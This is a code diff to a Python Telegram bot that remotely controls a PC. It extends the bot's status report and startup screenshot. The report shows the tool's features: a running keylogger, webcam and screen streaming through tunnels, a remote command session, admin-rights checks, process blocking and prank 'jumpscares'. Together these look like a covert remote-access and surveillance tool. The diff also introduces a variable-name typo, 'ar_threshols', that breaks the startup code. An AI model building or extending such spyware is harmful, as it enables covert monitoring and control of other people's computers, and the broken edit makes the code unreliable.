@@ -451,14 +451,14 @@ class PeppinoTelegram:
         self.loading_bar_set = loading_bar_set
         self.loading_bar_spinner = loading_bar_spinner
 
+
+        self.RESTART_TIME_TRESHOLD = 60 * 15 # After this seconds are passed and no message was received the bot will restart itself assuming it crashed or got blocked in some loop
         # this is used to send input prompts to the user without stopping the code
         self.user = {
             "status":None,             #can be "input_requested" or None 
             "last_response":None,       #can be None, or the last response of an input
             "last_message_timestamp":None,
         }
-
-        self.RESTART_TIME_TRESHOLD = 60 * 120 # After this seconds are passed and no message was received the bot will restart itself assuming it crashed or got blocked in some loop
 
         self.MOUSE_JMP = 50
 
@@ -758,7 +758,7 @@ class PeppinoTelegram:
         if volume:
             self._audio_mixer_set_volume(old)
 
-    def __send_image(self, image_name: str | None = None, image_buf: io.BytesIO = None, caption=None) -> int:
+    def __send_image(self, image_name: str | None = None, image_buf: io.BytesIO = None, caption=None, reply_markup=None) -> int:
         print(f"Sending image: {image_name}, caption={caption}")
         """
         return a message id
@@ -766,10 +766,10 @@ class PeppinoTelegram:
         try:
             assert (image_name is None) ^ (image_buf is None), "You can only use either image_name or image_buf"
             if image_buf:
-                msg = self.bot.sendPhoto(self.owner_id, image_buf, caption=caption)["message_id"]
+                msg = self.bot.sendPhoto(self.owner_id, image_buf, caption=caption, reply_markup=reply_markup)["message_id"]
             if image_name:
                 with open(image_name, "rb") as image:
-                    msg = self.bot.sendPhoto(self.owner_id, image, caption=caption)["message_id"]
+                    msg = self.bot.sendPhoto(self.owner_id, image, caption=caption, reply_markup=reply_markup)["message_id"]
             return msg
         except Exception as e:
             return self.bsend(f"Error while sending an image\n{e}")
@@ -2556,14 +2556,14 @@ The bot is now restarting. Please wait a moment...
         self.bsendWithHtml("🖱️ Pressing <b>right click</b>")
         pg.rightClick() #no shit
 
-    def screenshot(self) -> None: #AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
+    def screenshot(self, caption: str|None=None, reply_markup=None) -> None: #AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
         print("Taking screenshot")
         try:
             for scrt in fast_screenshot():
                 mon, img = scrt["monitor"],scrt["screenshot"]
                 f = cv2_to_bytesio(img)
                 f.name = "Screenshot.png"
-            self.__send_image(image_buf=f, caption=mon)
+            self.__send_image(image_buf=f, caption=caption or mon, reply_markup=reply_markup)
         except Exception as e:
             return self.display_exception(f"Error while getting screenshot\n{e}")
 
@@ -2621,13 +2621,60 @@ The bot is now restarting. Please wait a moment...
                     pass
 
     def send_status(self) -> None:
-        lines = ["<b>📋 self.user Overview</b>\n"]
+        """Enhanced status that now includes ALL bot settings"""
+        lines = [
+            "<b>📊 FULL BOT STATUS REPORT</b>\n",
+            "━━━━━━━━━━━━━━━━━━━━━━\n",
+            "<b>👤 User / Session</b>",
+        ]
 
+        # Original user dict (kept + improved formatting)
         for key, value in sorted(self.user.items()):
             val_str = json.dumps(value, default=str, ensure_ascii=False)
             if len(val_str) > 60:
                 val_str = val_str[:57] + "..."
             lines.append(f"<b>{html.escape(key)}</b>: <code>{html.escape(val_str)}</code>")
+
+        lines.append("\n<b>⚙️ Core Settings</b>")
+
+        # === All settings you asked for + everything else I found ===
+        current_vol = self.audio_mixer.getVolumePercentage()
+        restart_human = "DISABLED" if self.RESTART_TIME_TRESHOLD is None else \
+                        f"{self.RESTART_TIME_TRESHOLD}s" if self.RESTART_TIME_TRESHOLD < 120 else \
+                        f"{self.RESTART_TIME_TRESHOLD//60} min" if self.RESTART_TIME_TRESHOLD < 3600 else \
+                        f"{self.RESTART_TIME_TRESHOLD//3600} h"
+
+        lines.extend([
+            f"🔊 <b>Jumpscare volume</b>: <code>{self.jumpscare_volume}%</code>",
+            f"📢 <b>System volume</b>: <code>{current_vol}%</code>",
+            f"🖱️ <b>Mouse jump</b>: <code>{self.MOUSE_JMP} px</code>",
+            f"⏰ <b>Auto-restart threshold</b>: <code>{restart_human}</code>",
+            f"⏳ <b>Message timeout</b>: <code>{self.message_timeout}s</code>",
+            f"🎨 <b>Loading bar</b>: <code>{self.loading_bar_set[0]}{self.loading_bar_set[1]}</code> | spinner <code>{self.loading_bar_spinner[0]}</code>",
+            f"🌐 <b>Tunnel provider</b>: <code>{self.tunnel_provider}</code> | ngrok ready: <code>{'✅' if self.can_use_ngrok else '❌'}</code>",
+            f"🛡️ <b>Admin rights</b>: <code>{'YES ✅' if self.has_admin else 'NO ❌'}</code>",
+            f"📡 <b>Connection</b>: <code>{'🟢 ONLINE' if self.connected else '🔴 OFFLINE'}</code>",
+            f"🖼️ <b>Wallpaper backup</b>: <code>{'✅ Exists' if getattr(self, 'backup_wallpaper_path', None) else '❌ None'}</code>",
+        ])
+
+        # Active tunnels
+        tunnels = []
+        if self.webcam_url: tunnels.append("📹 Webcam")
+        if self.screen_url: tunnels.append("🖥️ Screen")
+        if self.webcam_and_screen_url: tunnels.append("📹🖥️ Both")
+        lines.append(f"📡 <b>Active streams</b>: <code>{', '.join(tunnels) if tunnels else 'None'}</code>")
+
+        # Other useful live stats
+        lines.extend([
+            f"💻 <b>CMD session</b>: <code>{'ACTIVE' if self.cmd_session_active else 'inactive'}</code>",
+            f"🚫 <b>Strangers blocked</b>: <code>{len(self.strangers)}</code>",
+            f"📊 <b>Process monitor</b>: <code>{len(self.processmonitorlist)}</code>",
+            f"🔒 <b>Cantopen list</b>: <code>{len(self.cantopenlist)}</code>",
+            f"⌨️ <b>Keylogger</b>: <code>running</code>",
+            f"🧩 <b>Plugins loaded</b>: <code>{'✅' if 'plugins' in globals() and plugins else '❌'}</code>",
+        ])
+
+        lines.append("\n━━━━━━━━━━━━━━━━━━━━━━\n<i>📸 Use /selfie to also get a fresh webcam shot</i>")
 
         self.bsendWithHtml("\n".join(lines))
 
@@ -3082,10 +3129,10 @@ The bot is now restarting. Please wait a moment...
 
         STARTING_LOG_MESSAGE.edit("🌐 GETTING PUBLIC IP")
         public_ip = get_public_ip()
-        STARTING_LOG_MESSAGE.edit("📋 GETTING BASIC INFO AND 📸 WEBCAM SELFIE")
+        STARTING_LOG_MESSAGE.edit("📋 GETTING BASIC INFO AND SCREENSHOT")
 
         if self.RESTART_TIME_TRESHOLD is None:
-            ar_thresholds = "N/A"
+            ar_threshols = "N/A"
             ar_measure = None
         
         elif self.RESTART_TIME_TRESHOLD < 120:
@@ -3118,12 +3165,12 @@ The bot is now restarting. Please wait a moment...
         )
 
         try:
-            self.selfie(
+            self.screenshot(
                 caption=botstartedmessage,
                 reply_markup=self.replyquickmenu()
             )
         except Exception as e:
-            print(f"Startup selfie failed: {e}")
+            print(f"Startup screenshot failed: {e}")
 
         #cleanup update
         self.bot.getUpdates(-1) #if the bot gets accidentally added to a group, which telepot can't handle, this will fix it
